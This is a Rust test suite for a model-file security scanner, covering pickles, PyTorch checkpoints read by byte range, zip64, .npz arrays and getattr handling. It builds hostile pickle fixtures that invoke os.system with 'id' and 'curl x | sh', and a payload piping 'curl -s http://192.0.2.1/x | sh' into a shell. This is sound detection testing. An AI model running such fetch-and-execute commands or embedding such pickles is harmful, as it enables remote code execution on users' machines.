    assert!(r.issues.is_empty(), "{:?}", rules(&r));
    assert_eq!(r.calls.len(), 1, "the call is held for model_own");
    let model = |r: &Report| (u("assets/m.pkl"), false, r.imports.clone(), r.calls.clone());
    let sev = |got: &[(PyStr, Value)]| -> Vec<String> {
        let mut v: Vec<String> = got.iter().map(|(_, i)| pystr::to_string(i.as_arr().unwrap()[3].as_str().unwrap())).collect();
        v.sort();
        v
    };
    let plain = "from enum import Enum\nclass Source(Enum):\n    HF = 'https://huggingface.co/datasets/x'\n";
    for files in [vec![(u("mypkg/__init__.py"), false, Some(u(""))), (u("mypkg/kinds.py"), false, Some(u(plain)))],
                  vec![(u("mypkg/kinds.py"), false, None)],
                  vec![(u("src/mypkg/kinds.py"), false, Some(u(plain))), (u("loader.py"), false, Some(u("import sys\nsys.path.insert(0, 'alt')\n")))],
                  vec![(u("mypkg/kinds.py"), false, Some(u(plain))), (u("enum.py"), false, Some(u("class Enum: pass\n")))],
                  vec![(u("mypkg/kinds.py"), false, Some(u(&format!("{plain}alias = Source\nalias._missing_ = classmethod(lambda c, v: v)\n"))))]] {
        assert_eq!(sev(&own_imports(&p, &[model(&r)], &files)), vec!["INFO", "MAJOR"], "{files:?}");
    }
    // no source of the class (__main__, a package not in the scan): MAJOR alone
    let r2 = rd("m.pkl", &pkl("__main__", "https://huggingface.co/datasets/x")).unwrap();
    assert_eq!(sev(&own_imports(&p, &[model(&r2)], &[(u("mypkg/kinds.py"), false, Some(u(plain)))])), vec!["MAJOR"]);
    // a dependency's own enum: its module's INFO and the call's MAJOR; the project's file calling it: MAJOR
    let dep = |r: &Report| (u(".venv/lib/python3.12/site-packages/mypkg/data/m.pkl"), true, r.imports.clone(), r.calls.clone());
    let files = vec![(u(".venv/lib/python3.12/site-packages/mypkg/kinds.py"), true, Some(u(plain)))];
    assert_eq!(sev(&own_imports(&p, &[dep(&r)], &files)), vec!["INFO", "MAJOR"]);
    assert_eq!(sev(&own_imports(&p, &[model(&r)], &files)), vec!["MAJOR"]);
    // a call with plain names and numbers is no held call (John's decision of Oct 21: Color('red'), Color(3)): the
    // own module's INFO alone
    let word = rd("m.pkl", &pkl("mypkg.kinds", "red")).unwrap();
    assert!(word.calls.is_empty() && word.issues.is_empty(), "{:?}", rules(&word));
    assert_eq!(sev(&own_imports(&p, &[model(&word)], &[(u("mypkg/kinds.py"), false, None)])), vec!["INFO"]);
}

// ---- a zip model file read by range (John's decision of Oct 21: a checkpoint of any size is judged) --------------

/// A piece of a file the test host holds: bytes, a run of zeros it never holds (a checkpoint's storages), or bytes
/// and such a run after them (an .npy's header and its data).
enum Seg {
    B(Vec<u8>),
    Z(u64),
    BZ(Vec<u8>, u64),
}

impl Seg {
    fn len(&self) -> u64 {
        match self {
            Seg::B(v) => v.len() as u64,
            Seg::Z(n) => *n,
            Seg::BZ(v, n) => v.len() as u64 + n,
        }
    }
}

/// A file read by range: its pieces, one after another.
struct Virtual {
    segs: Vec<(u64, Seg)>,
    size: u64,
}

impl Virtual {
    fn of(bytes: Vec<u8>) -> Virtual {
        let size = bytes.len() as u64;
        Virtual { segs: vec![(0, Seg::B(bytes))], size }
    }

    fn read(&self, off: u64, len: u64) -> Vec<u8> {
        let end = off.saturating_add(len).min(self.size);
        let mut out = Vec::new();
        for (so, s) in &self.segs {
            let se = so + s.len();
            if se <= off || *so >= end {
                continue;
            }
            let (a, b) = (off.max(*so), end.min(se));
            match s {
                Seg::B(v) => out.extend_from_slice(&v[(a - so) as usize..(b - so) as usize]),
                Seg::Z(_) => out.resize(out.len() + (b - a) as usize, 0),
                Seg::BZ(v, _) => {
                    let vl = v.len() as u64;
                    let (x, y) = ((a - so).min(vl), (b - so).min(vl));
                    out.extend_from_slice(&v[x as usize..y as usize]);
                    out.resize(out.len() + ((b - so) - y.max(a - so)) as usize, 0);
                }
            }
        }
        out
    }
}

/// A zip of (name, method, the entry's bytes as stored, its size), zip64 where it must be (sizes or offsets past
/// 4 GiB), as torch.save writes a large checkpoint.
fn virtual_zip(entries: Vec<(&str, u16, Seg, u64)>) -> Virtual {
    let mut segs: Vec<(u64, Seg)> = Vec::new();
    let mut pos = 0u64;
    let mut cd = Vec::new();
    let count = entries.len() as u64;
    let mut any64 = false;
    for (name, method, body, size) in entries {
        let off = pos;
        let csize = body.len();
        let big = csize >= 0xFFFF_FFFF || size >= 0xFFFF_FFFF;
        let far = off >= 0xFFFF_FFFF;
        any64 |= big || far;
        let mut h = b"PK\x03\x04\x2d\x00\x00\x00".to_vec();
        h.extend_from_slice(&method.to_le_bytes());
        h.extend_from_slice(&[0u8; 8]);                               // time, date, crc
        if big {
            h.extend_from_slice(&[0xFF; 8]);
        } else {
            h.extend_from_slice(&(csize as u32).to_le_bytes());
            h.extend_from_slice(&(size as u32).to_le_bytes());
        }
        h.extend_from_slice(&(name.len() as u16).to_le_bytes());
        h.extend_from_slice(&(if big { 20u16 } else { 0 }).to_le_bytes());
        h.extend_from_slice(name.as_bytes());
        if big {
            h.extend_from_slice(&1u16.to_le_bytes());
            h.extend_from_slice(&16u16.to_le_bytes());
            h.extend_from_slice(&size.to_le_bytes());
            h.extend_from_slice(&csize.to_le_bytes());
        }
        let hl = h.len() as u64;
        segs.push((pos, Seg::B(h)));
        pos += hl;
        segs.push((pos, body));
        pos += csize;
        let mut x = Vec::new();
        if big || far {
            let mut body = Vec::new();
            if big {
                body.extend_from_slice(&size.to_le_bytes());
                body.extend_from_slice(&csize.to_le_bytes());
            }
            if far {
                body.extend_from_slice(&off.to_le_bytes());
            }
            x.extend_from_slice(&1u16.to_le_bytes());
            x.extend_from_slice(&(body.len() as u16).to_le_bytes());
            x.extend_from_slice(&body);
        }
        cd.extend_from_slice(b"PK\x01\x02\x2d\x00\x2d\x00\x00\x00");
        cd.extend_from_slice(&method.to_le_bytes());
        cd.extend_from_slice(&[0u8; 8]);                              // time, date, crc
        if big {
            cd.extend_from_slice(&[0xFF; 8]);
        } else {
            cd.extend_from_slice(&(csize as u32).to_le_bytes());
            cd.extend_from_slice(&(size as u32).to_le_bytes());
        }
        cd.extend_from_slice(&(name.len() as u16).to_le_bytes());
        cd.extend_from_slice(&(x.len() as u16).to_le_bytes());
        cd.extend_from_slice(&[0u8; 10]);                             // comment, disk, attributes
        cd.extend_from_slice(&(if far { 0xFFFF_FFFFu32 } else { off as u32 }).to_le_bytes());
        cd.extend_from_slice(name.as_bytes());
        cd.extend_from_slice(&x);
    }
    let cd_off = pos;
    let cd_len = cd.len() as u64;
    let mut tail = cd;
    if any64 || cd_off >= 0xFFFF_FFFF {
        let z = cd_off + cd_len;
        tail.extend_from_slice(b"PK\x06\x06");
        tail.extend_from_slice(&44u64.to_le_bytes());
        tail.extend_from_slice(&[0x2d, 0, 0x2d, 0]);
        tail.extend_from_slice(&[0u8; 8]);
        tail.extend_from_slice(&count.to_le_bytes());
        tail.extend_from_slice(&count.to_le_bytes());
        tail.extend_from_slice(&cd_len.to_le_bytes());
        tail.extend_from_slice(&cd_off.to_le_bytes());
        tail.extend_from_slice(b"PK\x06\x07\x00\x00\x00\x00");
        tail.extend_from_slice(&z.to_le_bytes());
        tail.extend_from_slice(&1u32.to_le_bytes());
        tail.extend_from_slice(b"PK\x05\x06\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00");
    } else {
        tail.extend_from_slice(b"PK\x05\x06\x00\x00\x00\x00");
        tail.extend_from_slice(&(count as u16).to_le_bytes());
        tail.extend_from_slice(&(count as u16).to_le_bytes());
        tail.extend_from_slice(&(cd_len as u32).to_le_bytes());
        tail.extend_from_slice(&(cd_off as u32).to_le_bytes());
        tail.extend_from_slice(&0u16.to_le_bytes());
    }
    let tl = tail.len() as u64;
    segs.push((pos, Seg::B(tail)));
    Virtual { segs, size: pos + tl }
}

/// Read `v` by range as a host does (collect.rs, core, the registry): its first 512 bytes, then each range the
/// reading asks for, at most PICKLE_MAX_READS times -> (the report, the bytes read, the reads).
fn by_range(path: &str, v: &Virtual) -> (Report, u64, u64) {
    let p = crate::pack::current();
    let max = p.int("PICKLE_MAX_READS") as u64;
    let mut pieces: Vec<(u64, Vec<u8>)> = vec![(0, v.read(0, 512))];
    let mut reads = 0u64;
    loop {
        let given = pieces.iter().map(|(o, b)| (*o, b.as_slice())).collect();
        let src = zip::Bytes::pieces(v.size, given, range_cap(&p));
        match read_ranges(&p, &u(path), &src, false, reads >= max) {
            Ranged::Need(n) => {
                assert!(reads < max, "the reading asked again after its last read");
                for (o, l) in n {
                    pieces.push((o, v.read(o, l)));
                }
                reads += 1;
            }
            Ranged::Report(r) => return (r, pieces.iter().map(|(_, b)| b.len() as u64).sum(), reads),
            Ranged::Not => panic!("not a model file"),
        }
    }
}

/// A checkpoint as torch.save writes one, its storages `storage` bytes each (never held), and `more` after them.
fn big_checkpoint(pkl: Vec<u8>, storages: &[u64], more: Vec<(&'static str, Vec<u8>)>) -> Virtual {
    let mut e: Vec<(&str, u16, Seg, u64)> = Vec::new();
    let n = pkl.len() as u64;
    e.push(("big/data.pkl", 0, Seg::B(pkl), n));
    e.push(("big/.format_version", 0, Seg::B(b"1".to_vec()), 1));
    e.push(("big/byteorder", 0, Seg::B(b"little".to_vec()), 6));
    const NAMES: [&str; 4] = ["big/data/0", "big/data/1", "big/data/2", "big/data/3"];
    for (k, &s) in storages.iter().enumerate() {
        e.push((NAMES[k], 0, Seg::Z(s), s));
    }
    for (name, b) in more {
        let n = b.len() as u64;
        e.push((name, 0, Seg::B(b), n));
    }
    e.push(("big/version", 0, Seg::B(b"3\n".to_vec()), 2));
    e.push(("big/.data/serialization_id", 0, Seg::B(b"1234".to_vec()), 4));
    virtual_zip(e)
}

#[test]
fn a_large_checkpoint_is_read_by_range() {
    // 300 MB of storages: quiet, and read in a few KB (its end records, its directory, its data.pkl)
    let v = big_checkpoint(state_dict(), &[100_000_000; 3], vec![]);
    assert!(v.size > 300_000_000);
    let (r, read, reads) = by_range("weights/model.pt", &v);
    assert_eq!(r.kind, "pytorch");
    assert!(r.issues.is_empty(), "{:?}", rules(&r));
    assert!(!r.opaque);
    assert!(read < 200_000, "{read} bytes read");
    assert!(reads <= 4, "{reads} reads");
    // a hostile one of the same size: CRITICAL
    let (r, read, _) = by_range("weights/model.pt", &big_checkpoint(os_system("id"), &[100_000_000; 3], vec![]));
    assert!(has(&rules(&r), "SC-PICKLE-CODE", "CRITICAL", "it calls os.system with 'id'"), "{:?}", rules(&r));
    assert!(read < 200_000);
    // a pickle after the storages (TorchScript's constants.pkl): read too
    let (r, ..) = by_range("m.pt", &big_checkpoint(state_dict(), &[100_000_000; 2],
                                                   vec![("big/constants.pkl", os_system("curl x | sh"))]));
    assert!(has(&rules(&r), "SC-PICKLE-CODE", "CRITICAL", "big/constants.pkl"), "{:?}", rules(&r));
    // 5 GB, zip64 (sizes and offsets past 4 GiB): the same
    let v = big_checkpoint(state_dict(), &[2_500_000_000, 2_500_000_000], vec![]);
    assert!(v.size > 5_000_000_000);
    let (r, read, _) = by_range("m.pt", &v);
    assert!(r.issues.is_empty(), "{:?}", rules(&r));
    assert!(read < 200_000);
    let (r, ..) = by_range("m.pt", &big_checkpoint(state_dict(), &[2_500_000_000, 2_500_000_000],
                                                   vec![("big/extra.pkl", os_system("id"))]));
    assert!(has(&rules(&r), "SC-PICKLE-CODE", "CRITICAL", "big/extra.pkl"), "{:?}", rules(&r));
    // an .npz of 100 MB arrays: their headers read (the first 128 KiB of each), not their data; an object array
    // among them: its pickle
    let h = npy("'<f8'", &[]);
    let npz = |tail: Option<Vec<u8>>| {
        let mut e: Vec<(&str, u16, Seg, u64)> = Vec::new();
        let n = h.len() as u64 + 100_000_000;
        e.push(("a.npy", 0, Seg::BZ(h.clone(), 100_000_000), n));
        e.push(("b.npy", 0, Seg::BZ(h.clone(), 100_000_000), n));
        if let Some(t) = tail {
            let n = t.len() as u64;
            e.push(("o.npy", 0, Seg::B(t), n));
        }
        virtual_zip(e)
    };
    let (r, read, _) = by_range("arrays.npz", &npz(None));
    assert_eq!(r.kind, "numpy");
    assert!(r.issues.is_empty() && !r.opaque, "{:?}", rules(&r));
    assert!(read < 1_000_000, "{read}");
    let (r, ..) = by_range("arrays.npz", &npz(Some(npy("'|O'", &P::default().proto(3).global("os", "system").s("id").t1().reduce().stop()))));
    assert!(has(&rules(&r), "SC-PICKLE-CODE", "CRITICAL", "o.npy"), "{:?}", rules(&r));
}

/// A raw deflate stream: `empty` empty stored blocks, then `data` in stored blocks.
fn deflate_stored(empty: usize, data: &[u8]) -> Vec<u8> {
    let mut out = Vec::new();
    for _ in 0..empty {
        out.extend_from_slice(&[0x00, 0x00, 0x00, 0xFF, 0xFF]);
    }
    let z = zlib_stored(data);
    out.extend_from_slice(&z[2..z.len() - 4]);
    out
}

#[test]
fn reading_by_range_is_reading_the_whole_file() {
    let two = zip_of(&[("a/data.pkl", &state_dict()), ("a/data/0", &[0u8; 8]), ("b/data.pkl", &os_system("id")),
                       ("a/version", b"3\n")]);
    let extra = zip_of(&[("a/data.pkl", &state_dict()), ("a/evil.so", b"\x7fELF"), ("a/version", b"3\n")]);
    let folders = zip_of(&[("a/", b""), ("a/data.pkl", &state_dict()), ("a/version", b"3\n")]);
    let obj = npy("'|O'", &P::default().proto(3).global("os", "system").s("id").t1().reduce().stop());
    let npz = zip_of(&[("w.npy", &npy("'<f8'", &[0u8; 24])), ("o.npy", &obj)]);
    let nested = checkpoint(&P::default().proto(2).global("torch.storage", "_load_from_bytes")
                                .bytes(&checkpoint(&os_system("id"))).t1().reduce().stop());
    let deflated = |empty: usize| {
        // a deflated .npy behind `empty` empty blocks (numpy reads past them; so does the reader, whole or by range)
        let d = deflate_stored(empty, &obj);
        let v = virtual_zip(vec![("o.npy", 8, Seg::B(d), obj.len() as u64)]);
        v.read(0, v.size)
    };
    let files: Vec<(&str, Vec<u8>)> = vec![
        ("golden.pt", checkpoint(&state_dict())), ("bad.pt", checkpoint(&os_system("id"))), ("two.pt", two),
        ("extra.pt", extra), ("folders.pt", folders), ("x.npz", npz), ("nested.pt", nested),
        ("cut.pt", checkpoint(&os_system("id")[..10])), ("d.npz", deflated(4)), ("e.npz", deflated(40_000)),
    ];
    for (name, bytes) in files {
        let whole = rd(name, &bytes).expect("a model file");
        let (ranged, ..) = by_range(name, &Virtual::of(bytes.clone()));
        assert_eq!(rules(&whole), rules(&ranged), "{name}");
        assert_eq!((whole.kind, whole.opaque, &whole.imports), (ranged.kind, ranged.opaque, &ranged.imports), "{name}");
    }
    // the object array behind 200 KB of empty blocks is read either way
    assert!(has(&one("e.npz", &deflated(40_000)), "SC-PICKLE-CODE", "CRITICAL", "o.npy"));
}

#[test]
fn reading_by_range_is_bounded() {
    let p = crate::pack::current();
    let max = p.int("PICKLE_MAX_INFLATED") as u64;
    // a data.pkl past what the reader reads: SC-TRUNCATED, without reading it
    let v = virtual_zip(vec![("a/data.pkl", 0, Seg::BZ(b"\x80\x02".to_vec(), max), max + 2),
                             ("a/version", 0, Seg::B(b"3\n".to_vec()), 2)]);
    let (r, read, _) = by_range("big.pt", &v);
    assert!(has(&rules(&r), "SC-TRUNCATED", "CRITICAL", "more than the"), "{:?}", rules(&r));
    assert!(read < 1_000_000, "{read}");
    // a central directory past PICKLE_MAX_DIRECTORY: SC-TRUNCATED
    let mut many: Vec<(&str, u16, Seg, u64)> = vec![("a/data.pkl", 0, Seg::B(state_dict()), state_dict().len() as u64)];
    let names: Vec<String> = (0..60_000).map(|k| format!("a/data/{k:0>250}")).collect();
    for n in &names {
        many.push((n.as_str(), 0, Seg::B(Vec::new()), 0));
    }
    let v = virtual_zip(many);
    let (r, read, _) = by_range("many.pt", &v);
    assert!(has(&rules(&r), "SC-TRUNCATED", "CRITICAL", "more than the 16,000,000 read"), "{:?}", rules(&r));
    assert!(read < 1_000_000, "{read}");
    // what the host never gives (its last read): SC-TRUNCATED, naming the part
    let v = big_checkpoint(state_dict(), &[1_000_000], vec![]);
    let head = v.read(0, 512);
    let src = zip::Bytes::pieces(v.size, vec![(0, &head[..])], range_cap(&p));
    match read_ranges(&p, &u("m.pt"), &src, false, true) {
        Ranged::Report(r) => assert!(has(&rules(&r), "SC-TRUNCATED", "CRITICAL", "of its parts the reader reads was not read"),
                                     "{:?}", rules(&r)),
        _ => panic!("a report on the last read"),
    }
    // what is not a zip model file is not read by range
    let src = zip::Bytes::pieces(10, vec![(0, &b"\x80\x02N."[..])], range_cap(&p));
    assert!(matches!(read_ranges(&p, &u("m.pkl"), &src, false, false), Ranged::Not));
}

// ---- the precision review of Oct 21 (benign files of the real libraries; synthetic shapes here) ---------------------

#[test]
fn getattr_of_a_global_is_read_as_that_global() {
    // zoneinfo's datetimes: ZoneInfo.__reduce__ gives the bound ZoneInfo._unpickle, which pickle writes as
    // getattr(zoneinfo.ZoneInfo, '_unpickle') (__builtin__.getattr at protocols 0 to 2): quiet, as the method is
    let zone = |getattr_mod: &str| P::default().proto(2).global(getattr_mod, "getattr").binput(0)
        .global("zoneinfo", "ZoneInfo").binput(1).s("_unpickle").t2().reduce()
        .s("America/Chicago").int(1).t2().reduce()
        // a second datetime: getattr and ZoneInfo from the memo
        .binget(0).binget(1).s("_unpickle").t2().reduce().s("Europe/Paris").int(1).t2().reduce()
        .t2().stop();
    for m in ["__builtin__", "builtins"] {
        let f = one("tz.pkl", &zone(m));
        assert!(f.is_empty(), "{m}: {f:?}");
    }
    // an attribute that is code, however reached: CRITICAL
    let attr = |m: &str, n: &str, a: &str| P::default().proto(2).global("builtins", "getattr").global(m, n).s(a).t2().reduce()
        .s("id").t1().reduce().stop();
    for (m, n, a) in [("codecs", "builtins", "eval"), ("posixpath", "os", "system"), ("zoneinfo", "ZoneInfo", "__init__"),
                      ("collections", "OrderedDict", "__class__"), ("zoneinfo", "ZoneInfo", "__subclasses__")] {
        let f = one("m.pkl", &attr(m, n, a));
        assert!(has(&f, "SC-PICKLE-CODE", "CRITICAL", &format!("{m}.{n}.{a}")), "{m}.{n}.{a}: {f:?}");
    }
    // another attribute called with text it is told to use: as another function, MAJOR
    let told = P::default().proto(2).global("builtins", "getattr").global("somelib", "Loader").s("fetch").t2().reduce()
        .s("https://example.test/x").t1().reduce().stop();
    let f = one("m.pkl", &told);
    assert!(has(&f, "SC-PICKLE-GLOBAL", "MAJOR", "somelib.Loader.fetch with 'https://example.test/x'"), "{f:?}");
    // getattr stays builtins.getattr's (CRITICAL) on anything else: a chain, a value the pickle made, a default, a
    // name that is not one, getattr put anywhere but as the callee of such a call, or imported alone
    let chain = P::default().proto(2).global("builtins", "getattr").binput(0)
        .binget(0).global("zoneinfo", "ZoneInfo").s("_unpickle").t2().reduce().s("__globals__").t2().reduce().stop();
    let made = P::default().proto(2).global("builtins", "getattr")
        .global("collections", "OrderedDict").et().reduce().s("update").t2().reduce().stop();
    let default = P::default().proto(2).global("builtins", "getattr").global("zoneinfo", "ZoneInfo").s("_unpickle")
        .s("x").t3().reduce().stop();
    let not_a_name = P::default().proto(2).global("builtins", "getattr").global("zoneinfo", "ZoneInfo").s("a.b")
        .t2().reduce().stop();
    let also_held = P::default().proto(2).global("builtins", "getattr").binput(0)
        .global("zoneinfo", "ZoneInfo").s("_unpickle").t2().reduce()
        .raw(b"]").binget(0).raw(b"a").t2().stop();
    let alone = P::default().proto(2).global("builtins", "getattr").stop();
    // (and in both readings of an unaligned joblib array: plain pickle.load's reading of its bytes resolves getattr
    // from the stack it shares, joblib's calls it on what it computed)
    let fork = P::default().raw(b"000").global("zoneinfo", "ZoneInfo").s("_unpickle").t2().reduce().stop();
    let mut both = P::default().proto(2).global("builtins", "getattr").ed().s("coef_").0;
    both.extend(wrapper(fork.len().div_ceil(8) as u8, false).0);
    let mut arr = fork.clone();
    arr.resize(fork.len().div_ceil(8) * 8, 0);
    both.extend(arr);
    both.extend(P::default().setitem().raw(b"0").global("collections", "OrderedDict").et().reduce().s("update").t2().reduce().stop());
    for (what, pkl) in [("chain", chain), ("made", made), ("default", default), ("not a name", not_a_name),
                        ("also held", also_held), ("alone", alone), ("both readings", both)] {
        let f = one("m.pkl", &pkl);
        assert!(has(&f, "SC-PICKLE-CODE", "CRITICAL", "builtins.getattr"), "{what}: {f:?}");
    }
}

#[test]
fn the_data_types_of_modules_of_code_are_data() {
    // an enum member or a named tuple pickles as its class called with its value (the reviewer's LOW-1)
    let call = |m: &str, n: &str, arg: P| P::default().proto(2).global(m, n).raw(&arg.0).t1().reduce().stop();
    for (m, n) in [("http", "HTTPStatus"), ("http", "HTTPMethod"), ("signal", "Signals"), ("socket", "AddressFamily"),
                   ("os", "stat_result"), ("posix", "times_result"), ("platform", "uname_result"),
                   ("subprocess", "CompletedProcess"), ("commands", "CompletedProcess"), ("ssl", "TLSVersion"),
                   ("time", "struct_time"), ("resource", "struct_rusage")] {
        let f = one("m.pkl", &call(m, n, P::default().int(7)));
        assert!(f.is_empty(), "{m}.{n}: {f:?}");
    }
    // the modules' code stays code, and so does what is reached through a data type
    for (m, n) in [("os", "system"), ("signal", "signal"), ("http.client", "HTTPConnection"), ("http.server", "HTTPServer"),
                   ("subprocess", "Popen"), ("socket", "socket"), ("signal", "Signals.__new__")] {
        let f = one("m.pkl", &call(m, n, P::default().s("x")));
        assert!(has(&f, "SC-PICKLE-CODE", "CRITICAL", n), "{m}.{n}: {f:?}");
    }
}

#[test]
fn the_formats_own_helpers_are_the_format() {
    // pandas 3 with pyarrow: an array rebuilt from its buffers (the reviewer's HIGH-2)
    // (_restore_array((type, length, null_count, buffers, children, dictionary, offset)), the type by its alias and
    // each buffer by py_buffer)
    let arrow = P::default().proto(2).global("pyarrow.lib", "_restore_array")
        .mark().global("pyarrow.lib", "type_for_alias").s("large_string").t1().reduce().int(3).int(0)
        .raw(b"]").mark().none()
        .global("pyarrow.lib", "py_buffer").bytes(b"\x00\x00\x00\x00\x01\x00\x00\x00").t1().reduce()
        .global("pyarrow.lib", "py_buffer").bytes(b"abc").t1().reduce().raw(b"e")
        .raw(b"]").none().int(0).tuple().t1().reduce().stop();
    let f = one("frame.pkl", &arrow);
    assert!(f.is_empty(), "{f:?}");
    // pandas' Arrow extension types, by their bound deserializer
    let ext = P::default().proto(2).global("builtins", "getattr")
        .global("pandas.core.arrays.arrow.extension_types", "ArrowPeriodType").s("__arrow_ext_deserialize__").t2().reduce()
        .global("pyarrow.lib", "type_for_alias").s("int64").t1().reduce().bytes(b"{\"freq\": \"D\"}").t2().reduce().stop();
    let f = one("period.pkl", &ext);
    assert!(f.is_empty(), "{f:?}");
    // dateutil's tzfile with its zone file's path, and pytz's zone (the reviewer's LOW-2)
    let tz = P::default().proto(2).global("dateutil.tz.tz", "tzfile").raw(b"N").s("/usr/share/zoneinfo/Europe/Paris").t2()
        .reduce().ed().raw(b"b").stop();
    assert!(one("tz.pkl", &tz).is_empty());
    let pytz = P::default().proto(2).global("pytz", "_p").mark().s("America/Chicago").int(1).int(0).s("CST").tuple()
        .reduce().stop();
    assert!(one("tz.pkl", &pytz).is_empty());
    // torch.load reads torch.tensor as torch._tensor (load_module_mapping): its _rebuild_from_type_v2 calls func(*args)
    let alias = P::default().proto(2).global("torch.tensor", "_rebuild_from_type_v2")
        .mark().global("somelib", "run").global("torch", "Tensor").s("curl -s http://192.0.2.1/x | sh").t1().ed().tuple()
        .reduce().stop();
    let f = one("m.pkl", &alias);
    assert!(has(&f, "SC-PICKLE-GLOBAL", "MAJOR", "somelib.run with 'curl -s http://192.0.2.1/x | sh'"), "{f:?}");
}

#[test]
fn a_pickle_pandas_compressed_with_zip_is_read() {
    // to_pickle("frame.pkl.zip"): a zip of one member, the pickle (read_pickle reads it)
    let frame = P::default().proto(2).global("pandas.core.frame", "DataFrame").et().raw(&[0x81]).ed().build().stop();
    let z = zip_of(&[("frame.pkl", &frame)]);
    let r = rd("frame.pkl.zip", &z).expect("a model file");
    assert!(rules(&r).is_empty() && !r.opaque && r.kind == "compressed-pickle", "{:?} {} {}", rules(&r), r.opaque, r.kind);
    // its pickle is read for what it runs, and a zip of more than its pickle stays an archive
    let bad = P::default().proto(2).global("os", "system").s("id").t1().reduce().stop();
    let f = one("frame.pkl.zip", &zip_of(&[("frame.pkl", &bad)]));
    assert!(has(&f, "SC-PICKLE-CODE", "CRITICAL", "it calls os.system with 'id'"), "{f:?}");
    let r = rd("frames.zip", &zip_of(&[("a.pickle", &frame), ("notes.txt", b"x")])).expect("a model file");
    assert!(r.opaque && rules(&r).is_empty(), "{:?}", rules(&r));
    // a zip of other files is not a model file
    assert!(rd("docs.zip", &zip_of(&[("readme.txt", b"x"), ("a.pkl", &frame)])).is_none());
}

// ---- the external review of Oct 21 (H1–H7, M1–M4): inert bytes built here ---------------------------------------

/// A zip of (name, bytes, deflated?): stored, or deflated as stored blocks (deflate_stored), with their CRCs.
fn zip_m(entries: &[(&str, &[u8], bool)]) -> Vec<u8> {
    let crc = |b: &[u8]| lazaret_verify::inflate::crc32(0, b);
    let mut out = Vec::new();
    let mut cd = Vec::new();
    for (name, body, deflate) in entries {
        let raw = if *deflate { deflate_stored(0, body) } else { body.to_vec() };
        let method: u16 = if *deflate { 8 } else { 0 };
        let off = out.len() as u32;
        out.extend_from_slice(b"PK\x03\x04\x14\x00\x00\x00");
        out.extend_from_slice(&method.to_le_bytes());
        out.extend_from_slice(&[0u8; 4]);
        out.extend_from_slice(&crc(body).to_le_bytes());
        out.extend_from_slice(&(raw.len() as u32).to_le_bytes());
        out.extend_from_slice(&(body.len() as u32).to_le_bytes());
        out.extend_from_slice(&(name.len() as u16).to_le_bytes());
        out.extend_from_slice(&0u16.to_le_bytes());
        out.extend_from_slice(name.as_bytes());
        out.extend_from_slice(&raw);
        cd.extend_from_slice(b"PK\x01\x02\x14\x00\x14\x00\x00\x00");
        cd.extend_from_slice(&method.to_le_bytes());
        cd.extend_from_slice(&[0u8; 4]);
        cd.extend_from_slice(&crc(body).to_le_bytes());
        cd.extend_from_slice(&(raw.len() as u32).to_le_bytes());
        cd.extend_from_slice(&(body.len() as u32).to_le_bytes());
        cd.extend_from_slice(&(name.len() as u16).to_le_bytes());
        cd.extend_from_slice(&[0u8; 12]);
        cd.extend_from_slice(&off.to_le_bytes());
        cd.extend_from_slice(name.as_bytes());
    }
    let cd_off = out.len() as u32;
    out.extend_from_slice(&cd);
    out.extend_from_slice(b"PK\x05\x06\x00\x00\x00\x00");
    out.extend_from_slice(&(entries.len() as u16).to_le_bytes());
    out.extend_from_slice(&(entries.len() as u16).to_le_bytes());
    out.extend_from_slice(&(cd.len() as u32).to_le_bytes());
    out.extend_from_slice(&cd_off.to_le_bytes());
    out.extend_from_slice(&0u16.to_le_bytes());
    out
}

/// An .npy whose header is `header` exactly (padded as numpy pads it), and the bytes after it.
fn npy_h(header: &str, after: &[u8]) -> Vec<u8> {
    let mut h = header.as_bytes().to_vec();
    while (10 + h.len() + 1) % 64 != 0 {
        h.push(b' ');
    }
    h.push(b'\n');
    let mut out = b"\x93NUMPY\x01\x00".to_vec();
    out.extend_from_slice(&(h.len() as u16).to_le_bytes());
    out.extend_from_slice(&h);
    out.extend_from_slice(after);
    out
}

#[test]
fn h1_every_object_dtype_numpy_reads_is_read() {
    let headers = [r"{'descr': 'object', 'fortran_order': False, 'shape': (1,)}",
                   r"{'descr': '(1,)O', 'fortran_order': False, 'shape': (1,)}",
                   r"{'descr': '\x4f', 'fortran_order': False, 'shape': (1,)}",
                   r"{'descr': '\117', 'fortran_order': False, 'shape': (1,)}",
                   r"{'descr': 'O', 'fortran_order': False, 'shape': (1,)}",
                   r"{'descr':'<i8', 'descr':'|O', 'fortran_order':False, 'shape':(1,)}",
                   r"{'descr':[('x', 'object')], 'fortran_order':False, 'shape':(1,)}",
                   r"{'descr':[('x', '\x4f')], 'fortran_order':False, 'shape':(1,)}"];
    for h in headers {
        let a = npy_h(h, &os_system("id"));
        assert!(has(&one("m.npy", &a), "SC-PICKLE-CODE", "CRITICAL", "os.system"), "{h}");
        for deflate in [false, true] {
            let z = zip_m(&[("ok.npy", &npy_h("{'descr':'<i8', 'fortran_order':False, 'shape':(1,)}", &[0u8; 8]), deflate),
                            ("m.npy", &a, deflate)]);
            let r = rd("m.npz", &z).unwrap();
            assert!(has(&rules(&r), "SC-PICKLE-CODE", "CRITICAL", "m.npy"), "{h} {deflate}: {:?}", rules(&r));
            let v = Virtual { segs: vec![(0, Seg::B(z.clone()))], size: z.len() as u64 };
            let (r, ..) = by_range("m.npz", &v);
            assert!(has(&rules(&r), "SC-PICKLE-CODE", "CRITICAL", "m.npy"), "by range {h} {deflate}: {:?}", rules(&r));
        }
    }
    // a dtype the reader cannot place: SC-TRUNCATED, and an .npz not proven read keeps SC-NESTED-ARCHIVE
    let odd = npy_h(r"{'descr': 'T', 'fortran_order': False, 'shape': (1,)}", &os_system("id"));
    assert!(has(&one("m.npy", &odd), "SC-TRUNCATED", "CRITICAL", "cannot place"));
    let r = rd("m.npz", &zip_m(&[("m.npy", &odd, true)])).unwrap();
    assert!(r.opaque && has(&rules(&r), "SC-TRUNCATED", "CRITICAL", "cannot place"), "{:?}", rules(&r));
    // numeric arrays stay quiet, stored and deflated
    let r = rd("m.npz", &zip_m(&[("a.npy", &npy("'<f8'", &[0u8; 24]), true), ("b.npy", &npy("[('a', '<i4', (2,))]", &[0u8; 24]), false)])).unwrap();
    assert!(r.issues.is_empty() && !r.opaque, "{:?}", rules(&r));
}

#[test]
fn h2_every_entry_inside_the_directory_is_read() {
    let good = npy("'<i8'", &[0u8; 24]);
    let bad = npy("'|O'", &os_system("id"));
    let z = zip_m(&[("ok.npy", &good, false), ("bad.npy", &bad, false)]);
    for count in [0u16, 1, 3] {
        let mut b = z.clone();
